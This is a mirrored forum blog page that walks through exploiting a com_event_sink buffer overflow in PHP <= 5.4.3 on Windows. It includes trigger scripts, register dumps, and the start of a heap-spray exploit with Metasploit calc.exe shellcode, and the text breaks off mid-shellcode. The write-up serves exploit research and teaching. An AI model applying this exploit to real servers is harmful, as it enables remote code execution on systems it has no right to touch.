<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/entry.php?b=578 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:57:14 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->

	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="index.html" id="e_vb_meta_bburl" name="vb_meta_bburl"/>
<base/><!--[if IE]></base><![endif]-->
<meta content="vBulletin 4.2.1" name="generator"/>
<meta content="IE=9" http-equiv="X-UA-Compatible"/>

	<link href="favicon.ico" rel="Shortcut Icon" type="image/x-icon"/>


		<meta content="Reliable PHP Exploitation from Windows XP to Windows 7, ethical hacking,exploits,webapplication,penetration testing,wireless,information security,virus,exploit coding,vbulletin,forum,bbs,discussion,bulletin board,indian hackers" name="keywords"/>
		<meta content="Reliable PHP Exploitation from Windows XP to Windows 7 Rashid bhatt" name="description"/>



	<meta content="170793809601191" property="fb:app_id"/>
<meta content="Garage4hackers Forum" property="og:site_name"/>
<meta content="Reliable PHP Exploitation from Windows XP to Windows 7 Rashid bhatt" property="og:description"/>
<meta content="entry8d74.html?b=578" property="og:url"/>
<meta content="article" property="og:type"/>




	
		<script src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js" type="text/javascript"></script>
	

<script type="text/javascript">
<!--
	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
	{
		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
		var yuipath = 'clientscript/yui';
		var yuicombopath = '';
		var remoteyui = false;
	}
	else	// Load Rest of YUI remotely (where possible)
	{
		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
		var remoteyui = true;
		if (!yuicombopath)
		{
			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
		}
	}
	var SESSIONURL = "";
	var SECURITYTOKEN = "guest";
	var IMGDIR_MISC = "images/misc";
	var IMGDIR_BUTTON = "images/buttons";
	var vb_disable_ajax = parseInt("0", 10);
	var SIMPLEVERSION = "421";
	var BBURL = "index.html";
	var LOGGEDIN = 0 > 0 ? true : false;
	var THIS_SCRIPT = "entry";
	var RELPATH = "entry8d74.html?b=578";
	var PATHS = {
		forum : "",
		cms   : "",
		blog  : ""
	};
	var AJAXBASEURL = "index.html";
// -->
</script>
<script src="clientscript/vbulletin-core6719.js?v=421" type="text/javascript"></script>



	<link href="external9476.php?type=RSS2" rel="alternate" title="Garage4hackers Forum RSS Feed" type="application/rss+xml"/>
	



	<link href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," rel="stylesheet" type="text/css"/>

	<!--[if lt IE 8]>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
	<![endif]-->


	
		
			<link href="blog_external6663.php?type=RSS2&amp;bloguserid=3489" rel="alternate" title="Rashid bhatt - Garage4hackers Forum Blog RSS Feed" type="application/rss+xml"/>
		
		<link href="blog_external9476.php?type=RSS2" rel="alternate" title="Garage4hackers Forum - Blog RSS Feed" type="application/rss+xml"/>
	
	<link href="forum.html" rel="pingback"/>
	
		<!--
			<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
				xmlns:dc="http://purl.org/dc/elements/1.1/"
				xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
			<rdf:Description
				rdf:about="http://garage4hackers.com/entry.php?b=578"
				dc:identifier="http://garage4hackers.com/entry.php?b=578"
				dc:title="Reliable PHP Exploitation from Windows XP to Windows 7"
				trackback:ping="http://garage4hackers.com/blog_callback.php?b=578" />
			</rdf:RDF>
		-->
	
	
		<link href="css68b4.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite.css,blog.css,lightbox.css,attachment.css" rel="stylesheet" type="text/css"/>
	
	<!--[if lt IE 8]>
	<script type="text/javascript" src="clientscript/vbulletin-threadlist-ie.js?v=421"></script>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postbit-lite-ie.css,blog-ie.css" />
	<![endif]-->
	
	
	
	
		<script type="text/javascript">
		<!--
			vBulletin.register_control("vB_Blog_Userid", "3489");
		//-->
		</script>
	
<script src="clientscript/vbulletin_ajax_suggest6719.js?v=421" type="text/javascript"></script>
	
		<title>Reliable PHP Exploitation from Windows XP to Windows 7 - Blogs - Garage4hackers Forum</title>
	
	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>

</head>
<body>
<div class="above_body"> <!-- closing tag is in template navbar -->
<div class="floatcontainer doc_header" id="header">
	<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
	<div class="toplinks" id="toplinks">
		
			<ul class="nouser">
			
				<li><a href="register.html" rel="nofollow">Register</a></li>
			
				<li><a href="faq.html" rel="help">Help</a></li>
				<li>
			<script src="clientscript/vbulletin_md56719.html?v=421" type="text/javascript"></script>
			<form action="../external.html?link=http://garage4hackers.com/login.php?do=login" id="navbar_loginform" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
				<fieldset class="logindetails" id="logindetails">
					<div>
						<div>
					<input accesskey="u" class="textbox default-value" id="navbar_username" name="vb_login_username" size="10" tabindex="101" type="text" value="User Name"/>
					<input class="textbox" id="navbar_password" name="vb_login_password" size="10" tabindex="102" type="password"/>
					<input class="textbox default-value" id="navbar_password_hint" name="vb_login_password_hint" size="10" style="display:none;" tabindex="102" type="text" value="Password"/>
					<input accesskey="s" class="loginbutton" tabindex="104" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." type="submit" value="Log in"/>
						</div>
					</div>
				</fieldset>
				<div class="remember" id="remember">
					<label for="cb_cookieuser_navbar"><input accesskey="c" class="cb_cookieuser_navbar" id="cb_cookieuser_navbar" name="cookieuser" tabindex="103" type="checkbox" value="1"/> Remember Me?</label>
				</div>

				<input name="s" type="hidden" value=""/>
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="login"/>
				<input name="vb_login_md5password" type="hidden"/>
				<input name="vb_login_md5password_utf" type="hidden"/>
			</form>
			<script type="text/javascript">
			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
			vB_XHTML_Ready.subscribe(function()
			{
			//
				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
			});
			
			function navbar_username_focus(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == 'User Name')
				{
				//
					textbox.value='';
					textbox.style.color='#000000';
				}
			}

			function navbar_username_blur(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == '')
				{
				//
					textbox.value='User Name';
					textbox.style.color='#777777';
				}
			}
			
			function navbar_password_hint(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
				YAHOO.util.Dom.get('navbar_password').focus();
			}

			function navbar_password(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				if (textbox.value == '')
				{
					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
				}
			}
			</script>
				</li>
				
					<li class="hidden" id="fb_headerbox">

	<a href="#" id="fb_loginbtn"><img alt="The Facebook Platform" src="images/misc/facebook_login.gif"/></a>

</li>

				
			</ul>
		
	</div>
	<div class="ad_global_header">
		 
		 
	</div>
	<hr/>
</div>
<div class="navbar" id="navbar">
	<ul class="navtabs floatcontainer" id="navtabs">
		
		
	
		<li id="vbtab_whatsnew">
			<a class="navtab" href="activity.html">What's New?</a>
		</li>
		
		

	
		<li id="vbtab_cms">
			<a class="navtab" href="content.html">Articles</a>
		</li>
		
		

	
		<li id="vbtab_forum">
			<a class="navtab" href="forum.html">Forum</a>
		</li>
		
		

	
		<li class="selected" id="vbtab_blog">
			<a class="navtab" href="blog.html">Blogs</a>
		</li>
		
		
			<ul class="floatcontainer">
				
					
						
							<li id="vbblog_recent"><a href="blog2d60.html?do=list">Recent Entries</a></li>
						
					
				
					
						
							<li id="vbblog_popular"><a href="blog7e3c.html?do=list&amp;blogtype=best">Most Popular</a></li>
						
					
				
					
						
							<li id="vbblog_member"><a href="blogd08d.html?do=bloglist">Member Blogs</a></li>
						
					
				
			</ul>
		

	
		<li id="tab_nja4_357">
			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
		</li>
		
		

	
		<li id="tab_nta0_579">
			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
		</li>
		
		

	
		<li id="tab_nta0_442">
			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
		</li>
		
		

		<li>
            <a class="navtab" href="pages.html">Events and Conferences</a></li>
	</ul>
	
		<div class="globalsearch" id="globalsearch">
			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" class="navbar_search" id="navbar_search" method="post">
				
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="process"/>
				<span class="textboxcontainer"><span><input class="textbox" name="query" tabindex="99" type="text" value=""/></span></span>
				<span class="buttoncontainer"><span><input class="searchbutton" name="submit" onclick="document.getElementById('navbar_search').submit;" src="images/buttons/search.html" tabindex="100" type="image"/></span></span>
			</form>
			<ul class="navbar_advanced_search">
				<li><a accesskey="4" href="search.html">Advanced Search</a></li>
				
			</ul>
		</div>
	
</div>
</div><!-- closing div for above_body -->

<div class="body_wrapper">
<div class="breadcrumb" id="breadcrumb">
	<ul class="floatcontainer">
		<li class="navbithome"><a accesskey="1" href="content.html"><img alt="Home" src="images/misc/navbit-home.png"/></a></li>
		
	<li class="navbit"><a href="blog.html">Blogs</a></li>

	<li class="navbit"><a href="blog4258.html?u=3489">Rashid bhatt</a></li>

		
	<li class="navbit lastnavbit"><span>Reliable PHP Exploitation from Windows XP to Windows 7</span></li>

	</ul>
	<hr/>
</div>


<div style="width:728px; margin:0 auto; padding-bottom:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 728;
google_ad_height = 15;
google_ad_format = "728x15_0ads_al_s";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

<div id="ad_global_below_navbar"><script async="" src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- garage1 -->
<ins class="adsbygoogle" data-ad-client="ca-pub-6847984837250662" data-ad-slot="4036513682" style="display:inline-block;width:728px;height:90px"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>


	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" class="notices" id="notices" method="post">
		<input name="do" type="hidden" value="dismissnotice"/>
		<input name="s" type="hidden" value=""/>
		<input name="securitytoken" type="hidden" value="guest"/>
		<input id="dismiss_notice_hidden" name="dismiss_noticeid" type="hidden" value=""/>
		<input name="url" type="hidden" value=""/>
		<ol>
			<li class="restore" id="navbar_notice_2">
	
	
<h2>
The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 


</h2>

<!-- Mirrored from garage4hackers.com/entry.php?b=578 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:57:14 GMT -->

</li>
		</ol>
	</form>



<div class="blog" id="usercss">
	<div class="cleardiv"></div>

	
	
	<div id="content_container">
		<div id="content">
			<div class="blockrow restrain_container" id="content_inner">
			<!-- main content -->
			<div id="pagetitle">
	
	<a href="blog_external6663.php?type=RSS2&amp;bloguserid=3489" id="rssicon" rel="nofollow"><img alt="View RSS Feed" border="0" class="inlineimg" src="images/misc/rss_40b.png"/></a>
	
	<h1>Rashid bhatt</h1>
</div>




<div id="ad_blogshowentry_before"><script type="text/javascript"><!--
google_ad_client = "pub-6847984837250662";
/* 728x90, created 7/11/10 blog entry */
google_ad_slot = "0606213533";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script></div>
<div id="above_blogentry">
	
</div>
<div class="block blogentrybit" id="entry578">
	<h4 class="blog_header" id="blog_title">
		Reliable PHP Exploitation from Windows XP to Windows 7
		
		
	</h4>
	<div class="fly">
		
			<div class="popupmenu" id="blograting">
				<h6><a class="popupctrl" href="javascript://" id="blograting_current"><img alt="Rating: 6 votes, 4.17 average." class="inlineimg" src="images/rating/rating-15_4.png"/></a></h6>
				<form action="../external.html?link=http://garage4hackers.com/blog.php" id="blog_blograte_form" method="post">
					<div class="popupbody popuphover">
						<ul>
							
								<li><label for="r5"><span class="rating r5">
									<input id="r5" name="vote" type="radio" value="5"/> Excellent
								</span></label></li>
								<li><label for="r4"><span class="rating r4_right">
									<input id="r4" name="vote" type="radio" value="4"/> Good
								</span></label></li>
								<li><label for="r3"><span class="rating r3_right">
									<input id="r3" name="vote" type="radio" value="3"/> Average
								</span></label></li>
								<li><label for="r2"><span class="rating r2_right">
									<input id="r2" name="vote" type="radio" value="2"/> Bad
								</span></label></li>
								<li><label for="r1"><span class="rating r1_right">
									<input id="r1" name="vote" type="radio" value="1"/> Terrible
								</span></label></li>
								<li class="formsubmit"><input class="button" type="submit" value="Vote Now"/></li>
							
						</ul>
						<input name="s" type="hidden" value=""/>
						<input name="securitytoken" type="hidden" value="guest"/>
						<input name="do" type="hidden" value="rate"/>
						<input name="b" type="hidden" value="578"/>
					</div>
				</form>
				<script src="clientscript/blog_ajax_rate6719.html?v=421" type="text/javascript"></script>
				<script type="text/javascript">
				<!--
					var blogid = 578;
					vB_AJAX_BlogRate_Init('blog_blograte_form');
				//-->
				</script>
			</div>
		
	</div>
	<div class="block blogbit">
		<div class="bloghead">
			<div class="fly">
				
<a class="comments" href="entry8d74.html?b=578#comments">1 Comment</a>
				
				
			</div>
			<div class="blog_date">
				by <div class="popupmenu memberaction">
	<a class="username offline popupctrl" href="member4258.html?u=3489" title="Rashid bhatt is offline"><strong>Rashid bhatt</strong></a>
	<ul class="popupbody popuphover memberaction_body">
		<li class="left">
			<a class="siteicon_profile" href="member4258.html?u=3489">
				View Profile
			</a>
		</li>
		
		<li class="right">
			<a class="siteicon_forum" href="search55bd.html?do=finduser&amp;userid=3489&amp;contenttype=vBForum_Post&amp;showposts=1" rel="nofollow">
				View Forum Posts
			</a>
		</li>
		
		
		<li class="left">
			<a class="siteicon_message" href="private2657.html?do=newpm&amp;u=3489" rel="nofollow">
				Private Message
			</a>
		</li>
		
		
		
		<li class="right">
			<a class="siteicon_blog" href="blog4258.html?u=3489" rel="nofollow">
				View Blog Entries
			</a>
		</li>
		
		
		
		<li class="left">
			<a class="siteicon_homepage" href="../external.html?link=http://twitter.com/raashidbhatt">
				Visit Homepage
			</a>
		</li>
		
		
		
		<li class="right">
			<a class="siteicon_article" href="list00df.html?r=author/3489-Rashid-bhatt" rel="nofollow">
				View Articles
			</a>
		</li>
		

		

		
		
	</ul>
</div>, 01-11-2013 at 08:11 PM  (12122 Views)
			</div>
		</div>
		
			
<fb:like action="../external.html?link=http://garage4hackers.com/like" colorscheme="light" font="tahoma" href="entry8d74.html?b=578" layout="standard" show_faces="false" width="260"></fb:like>
		
		<div class="blogbody postcontainer">
			<div id="entry_text_578">
				<blockquote class="blogcontent restore floatcontainer">
					<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Theexploit code for PHP &lt;= 5.4.3 (com_event_sink) Code Execution </font></span></font><font color="#000080"><font size="3"><u><a href="../external.html?link=http://osvdb.org/show/osvdb/82307" target="_blank">82307: PHP com_event_sink Function Overflow DoS</a> </u></font></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3">was published by Rahul Saasi some time before on this forum and both ofus had a nice discussion about the vulnerability and possible attack vectors.</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Itried to dig deeper into the issue because exploiting this vulnerability with 100% reliability was quite challenging. In fact the exploit provided by both of us (rahul and me ) earlier, is not reliable at all because of the following reasons.</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">1:The shellcode buffer and the place from where EAX is fetched depends HIGHLY upon pre-determined memory location from the heap region A single change(even a white space) in the source code of the exploit will result in change in memory location of our shellcode buffer.</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">2:It may work if the exploit code is the lone script executing on the victim machine, but again memory offset will definitely change from OS to OS and service pack to service pack. so if you are able to inject the php exploit through an RFI(remote file inclusion) web vulnerability to attack the server the exploit is most likely not going to work.<br/>
</font></span></font><br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Thesecond part of this vulnerability is the main challenge and gives a false impression of ASLR even on the systems not running under such aprotection.</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Now, i have figured out two ways to reliably exploit on different OS'es.These methods can be used to bypass DEP and ASLR (separately) with 100% accuracy across different platforms.</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>                                                     What’s wrong with the previous exploits?</b></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">The previous exploits seemed to be working when the above given constraints are not present i.e under a single system and it was the only script running, with no change in the source code of the exploit.</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">This will give you an insight of the problems arising with the exploit code. </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">Lets consider the following code to trigger the vulnerability </font></span></font><br/>
<br/>
<br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">&lt;?php</font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">$buffer= str_repeat("a", 100); &lt;&lt; edi </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">$vVar= new VARIANT(0x04040404); </font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">$vVar2= new VARIANT("hello"); </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">com_event_sink($vVar,$vVar2, $buffer); </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">?&gt;</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">In this case the register output will be </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>EAX 00000000</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>ECX 00362940</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>EDX 0110D598</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>EBX 00000000</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>ESP 00C1F9F8</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>EBP 00C1FA4C</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>ESI 04040404</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i><b>EDI0110D608 ASCII &lt;&lt;&lt; edi</b></i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  a  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  "</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>EIP102F59BD php5ts.102F59BD</i></font></span></font><br/>
<br/>
<br/>
<br/>
<br/>
<font color="#000000"> <span style="font-family: Times New Roman"><font size="3">Fine, so EDI happens to hold our buffer at the location  </font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>0x</b></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i><b>0110D608</b></i></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i><b>NOTE:</b></i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>Please don’t be confused with the ASCII representation of our buffer . Basically in  ZEND Engine the php strings are stored in unicode(2 bytes) form because we are passing the string to com_event_sink  function , its later on converted to ASCII representation using zend_parse_parameter() ZEND API function. </i></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>As done in source code of com_com.c</i></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i>File:com_com.c fucntion:com_event_sink()</i></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&gt;&gt; parameter parsed </i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>if(FAILURE == zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC,"Oo|z/",<br/>
            &amp;object, php_com_variant_class_entry,&amp;sinkobject, &amp;sink)){<br/>
        RETURN_FALSE;<br/>
    }<br/>
<br/>
    php_com_initialize(TSRMLS_C);<br/>
    obj= CDNO_FETCH(object);<br/>
    <br/>
    if (sink &amp;&amp; Z_TYPE_P(sink) ==IS_ARRAY) {<br/>
        /* 0 =&gt; typelibname, 1 =&gt; dispname */<br/>
        zval**tmp;<br/>
<br/>
        if (zend_hash_index_find(Z_ARRVAL_P(sink), 0,(void**)&amp;tmp) == SUCCESS)<br/>
            typelibname =Z_STRVAL_PP(tmp);<br/>
        if (zend_hash_index_find(Z_ARRVAL_P(sink), 1,(void**)&amp;tmp) == SUCCESS)<br/>
            dispname = Z_STRVAL_PP(tmp);<br/>
    }else if (sink != NULL) {<br/>
        convert_to_string(sink);<br/>
        dispname= Z_STRVAL_P(sink); //</i></font></span></font><font color="#000000"><span style="font-family: Courier New"><font size="2"><i><b>convert to string representation</b></i></font></span></font><font color="#000000"><span style="font-family: Courier New"><font size="2"><i><br/>
    }</i></font></span></font><br/>
<br/>
<br/>
<br/>
<br/>
<font color="#000000"> <span style="font-family: Times New Roman"><font size="3">Now,because the values are stored somewhere in the heap and unfortunately that region of heap also happens to hold the information regarding the parse table of PHP  source code in close  boundaries. Now even a single change in the source code of the exploit will result in the change of address location of our buffer (EDI in this case) in the heap region. To show that, i will add a single comment line in the exploit  source code and then we will examine the difference between the previous and the next memory location.</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">&lt;?php</font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">//Hello this is a comment</font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">$buffer= str_repeat("a", 100); &lt;&lt; edi </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">$vVar= new VARIANT(0x04040404); </font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">$vVar2= new VARIANT("hello"); </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2">com_event_sink($vVar,$vVar2, $buffer); </font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">?&gt;</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">EAX 00000000</font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">ECX 00362940</font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">EDX 0110D538</font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">EBX 00000000</font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">ESP 00C1F9F8</font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">EBP 00C1FA4C</font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">ESI 04040404</font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>EDI 0110D5A8 ASCII"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  aaaaaa  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  "</b></font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">EIP 102F59BD php5ts.102F59BD</font></span></font><br/>
<br/>
<br/>
<font color="#000000"> <span style="font-family: Times New Roman"><font size="3">Now its clearly seen below that there is a huge difference between the memory location of our buffer that comes after we make a slight change in the source code. Wonder how much will be the difference when there a large amount of code added ?</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i><b>EDI– </b></i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>0110D608</b></font></span></font><br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><i><b>EDI– </b></i></font></span></font><font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>0110D5A8</b></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">That brings out large unpredictability if the vulnerability is exploited in such a way. </font></span></font><br/>
<br/>
<br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3"><b>                              Exploiting with Browser fashioned Heap spraying(Bypass ASLR).</b></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">As we have already seen the unpredictability if offsets are hard-coded ,we can use browser styled heap spraying for precision.</font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Times New Roman"><font size="3">We will spray the heap enough to reach to the memory location 0x04040404 and also we will use this address as our jump location with spray value as 0x04 itself.</font></span></font><br/>
<br/>
<br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>&lt;?php</i></font></span></font><br/>
<br/>
<br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>$buffer= str_repeat("\x04\x04", 27108862).  </i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31".// Metasploit calc.exe shellcode</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b".</i></font></span></font><br/>
<font color="#000000"><span style="font-family: Courier New"><font size="2"><i>"\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3".</i></font></span></font><br/>
